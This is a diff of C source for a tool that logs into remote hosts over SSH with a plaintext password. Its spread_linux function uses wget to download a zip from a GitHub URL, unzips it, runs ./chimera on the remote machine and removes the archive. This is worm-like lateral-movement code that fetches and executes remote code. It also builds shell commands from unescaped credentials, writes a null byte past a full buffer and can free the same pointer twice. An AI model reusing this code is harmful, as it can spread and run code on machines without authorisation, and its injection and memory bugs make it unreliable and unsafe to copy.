@@ -9,10 +9,10 @@
  * @param command The command to execute on the remote host.
  * @param remote_os The operating system of the remote host.
  */
-int establish_connection(const char* host, const char* username, const char* password, const char* command, const enum os_type remote_os) {
+char* establish_connection(const char* host, const char* username, const char* password, const char* command, const enum os_type remote_os) {
     char command_string[MAX_COMMAND_SIZE];
     int ret;
-    
+
     if(remote_os == LINUX) {
         #ifdef _WIN32
             ret = snprintf(command_string, sizeof(command_string), "echo y | %s -ssh %s -l %s -pw %s \"%s\"",
@@ -23,7 +23,7 @@ int establish_connection(const char* host, const char* username, const char* pas
         #endif
         if (ret >= sizeof(command_string)) {
             fprintf(stderr, "Command string too long\n");
-            return -1;
+            return NULL;
         }
     } 
     // Construct the command string for a Windows host
@@ -39,109 +39,120 @@ int establish_connection(const char* host, const char* username, const char* pas
         #endif
         if (ret >= sizeof(command_string)) {
             fprintf(stderr, "Command string too long\n");
-            return -1;
+            return NULL;
         }
     } 
     // Handle invalid operating system values
     else {
         fprintf(stderr, "Invalid operating system\n");
-        return -1;
+        return NULL;
     }
 
     // Open a pipe to execute the command string and read the output
     FILE* fp = POPEN(command_string, "r");
     if (fp == NULL) {
         perror("popen");
-        return -1;
+        return NULL;
     }
 
-    // Read the output of the command line by line and print it
-    char line[MAX_COMMAND_SIZE];
-    while (fgets(line, sizeof(line), fp) != NULL) {
-        printf("%s", line);
+    // Allocate a buffer to hold the output of the command
+    char* output_buffer = (char*) malloc(MAX_COMMAND_SIZE);
+    if (output_buffer == NULL) {
+        fprintf(stderr, "Failed to allocate output buffer\n");
+        PCLOSE(fp);
+        return NULL;
+    }
+
+    // Read the output of the command into the buffer
+    size_t bytes_read = fread(output_buffer, 1, MAX_COMMAND_SIZE, fp);
+    if (bytes_read == 0) {
+        fprintf(stderr, "Failed to read command output\n");
+        free(output_buffer);
+        PCLOSE(fp);
+        return NULL;
     }
 
     // Close the pipe and check for errors
     if (PCLOSE(fp) == -1) {
         perror("pclose");
-        return -1;
+        free(output_buffer);
+        return NULL;
     }
-    return 1;
+
+    // Null-terminate the output buffer
+    output_buffer[bytes_read] = '\0';
+
+    return output_buffer;
 }
 
-
 void spread_linux(const char* host, const char* username, const char* password) {
-    // Download the zip file from the URL
-    const char* url = "https://github.com/M00NLIG7/Chimera/raw/master/packaged.zip";
-    const char* filename = "packaged.zip";
-    char command_string[MAX_COMMAND_SIZE];
-    int ret;
-    
-    // "curl -o packaged.zip https://github.com/M00NLIG7/Chimera/raw/master/packaged.zip"
-    
-    ret = snprintf(command_string, sizeof(command_string), "wget %s",url);
-    if (ret >= sizeof(command_string)) {
-        fprintf(stderr, "Command string too long\n");
-        return;
+    // Check if the "Chimera" directory exists on the remote Linux machine
+    const char* check_chimera_dir_cmd = "if [ ! -d \"Chimera\" ]; then echo \"NOT_EXIST\"; fi";
+    char* output = establish_connection(host, username, password, check_chimera_dir_cmd, LINUX);
+
+    if (output != NULL && strcmp(output, "NOT_EXIST\n") == 0) {
+        // Download the zip file from the URL
+        const char* url = "https://github.com/M00NLIG7/Chimera/raw/master/packaged.zip";
+        const char* filename = "packaged.zip";
+        char command_string[MAX_COMMAND_SIZE];
+        int ret;
+
+        ret = snprintf(command_string, sizeof(command_string), "wget %s",url);
+        if (ret >= sizeof(command_string)) {
+            fprintf(stderr, "Command string too long\n");
+            return;
+        }
+
+        output = establish_connection(host, username, password, command_string, LINUX);
+        if (output != NULL) {
+            printf("%s\n", output);
+            free(output);
+        }
+
+        // Unzip the file on the remote Linux machine
+        ret = snprintf(command_string, sizeof(command_string), "unzip -o %s > /dev/null", filename);
+        if (ret >= sizeof(command_string)) {
+            fprintf(stderr, "Command string too long\n");
+            return;
+        }
+
+        output = establish_connection(host, username, password, command_string, LINUX);
+        if (output != NULL) {
+            printf("%s\n", output);
+            free(output);
+        }
+
+        // Run the command on the remote Linux machine
+        ret = snprintf(command_string, sizeof(command_string), "cd Chimera && ./chimera");
+        if (ret >= sizeof(command_string)) {
+            fprintf(stderr, "Command string too long\n");
+            return;
+        }
+
+        output = establish_connection(host, username, password, command_string, LINUX);
+        if (output != NULL) {
+            printf("%s\n", output);
+            free(output);
+        }
+
+        // Remove the zip file
+        ret = snprintf(command_string, sizeof(command_string), "rm -f %s", filename);
+        if (ret >= sizeof(command_string)) {
+            fprintf(stderr, "Command string too long\n");
+            return;
+        }
+
+        output = establish_connection(host, username, password, command_string, LINUX);
+        if (output != NULL) {
+            printf("%s\n", output);
+            free(output);
+        }
+    } else {
+        printf("Chimera directory already exists on the remote host.\n");
     }
 
-    if (establish_connection(host, username, password, command_string, LINUX) < 0) {
-        return;
-    }
-
-    // Check if Chimera directory exists
-    ret = snprintf(command_string, sizeof(command_string), "test -d Chimera && echo \"Directory exists\"");
-    if (ret >= sizeof(command_string)) {
-        fprintf(stderr, "Command string too long\n");
-        return;
-    }
-
-    // If the directory exists, do not continue with cloning and running the Chimera command
-    FILE* fp = POPEN(command_string, "r");
-    if (fp == NULL) {
-        perror("popen");
-        return;
-    }
-    char line[MAX_COMMAND_SIZE];
-    if (fgets(line, sizeof(line), fp) != NULL && strcmp(line, "Directory exists\n") == 0) {
-        printf("Chimera directory already exists. Skipping clone and execution.\n");
-        PCLOSE(fp);
-        return;
-    }
-    PCLOSE(fp);
-
-    // Unzip the file on the remote Linux machine
-    ret = snprintf(command_string, sizeof(command_string), "unzip -o %s > /dev/null", filename);
-    if (ret >= sizeof(command_string)) {
-        fprintf(stderr, "Command string too long\n");
-        return;
-    }
-
-    if (establish_connection(host, username, password, command_string, LINUX) < 0) {
-        return;
-    }
-
-    // Run the command on the remote Linux machine
-    ret = snprintf(command_string, sizeof(command_string), "cd Chimera && ./chimera");
-    if (ret >= sizeof(command_string)) {
-        fprintf(stderr, "Command string too long\n");
-        return;
-    }
-
-    printf(command_string);
-    if (establish_connection(host, username, password, command_string, LINUX) < 0) {
-        return;
-    }
-
-    // Remove the zip file
-    ret = snprintf(command_string, sizeof(command_string), "rm -f %s", filename);
-    if (ret >= sizeof(command_string)) {
-        fprintf(stderr, "Command string too long\n");
-        return;
-    }
-
-    if (establish_connection(host, username, password, command_string, LINUX) > 0) {
-        return;
+    if (output != NULL) {
+        free(output);
     }
 }
 
